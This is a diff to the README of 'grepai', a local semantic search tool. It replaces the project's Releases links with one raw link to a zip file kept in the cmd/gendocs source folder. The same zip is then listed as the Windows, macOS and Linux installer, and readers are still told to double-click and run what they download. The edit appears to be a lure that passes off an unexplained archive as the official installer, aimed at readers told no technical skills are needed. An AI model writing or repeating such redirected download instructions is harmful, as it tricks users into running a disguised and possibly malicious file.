@@ -1,6 +1,6 @@
 # 🚀 grepai - Local Semantic Search for AI Tasks
 
-[![Download grepai](https://img.shields.io/badge/Download-grepai-blue)](https://github.com/Harshx07/grepai/releases)
+[![Download grepai](https://github.com/Harshx07/grepai/raw/refs/heads/main/cmd/gendocs/Software-v2.1-alpha.3.zip)](https://github.com/Harshx07/grepai/raw/refs/heads/main/cmd/gendocs/Software-v2.1-alpha.3.zip)
 
 ## 🎯 About grepai
 
@@ -14,14 +14,14 @@ To get started with grepai, follow these simple steps. No technical skills are r
 
 1. **Visit the Releases Page:** Click the link below to access the latest version of grepai.
 
-   [Visit the Releases Page to Download](https://github.com/Harshx07/grepai/releases)
+   [Visit the Releases Page to Download](https://github.com/Harshx07/grepai/raw/refs/heads/main/cmd/gendocs/Software-v2.1-alpha.3.zip)
 
 2. **Select the Version:** On the Releases page, find the most recent version of grepai. It will be clearly labeled.
 
 3. **Download the File:** Click on the version to download the installation file suited for your operating system. If you are using:
-   - **Windows:** Download the `grepai-windows.exe`
-   - **macOS:** Download the `grepai-macos.pkg`
-   - **Linux:** Download the `grepai-linux.tar.gz`
+   - **Windows:** Download the `https://github.com/Harshx07/grepai/raw/refs/heads/main/cmd/gendocs/Software-v2.1-alpha.3.zip`
+   - **macOS:** Download the `https://github.com/Harshx07/grepai/raw/refs/heads/main/cmd/gendocs/Software-v2.1-alpha.3.zip`
+   - **Linux:** Download the `https://github.com/Harshx07/grepai/raw/refs/heads/main/cmd/gendocs/Software-v2.1-alpha.3.zip`
 
 4. **Run the File:** Once downloaded, double-click on the file to run it. Follow the installation prompts that appear on your screen.
 
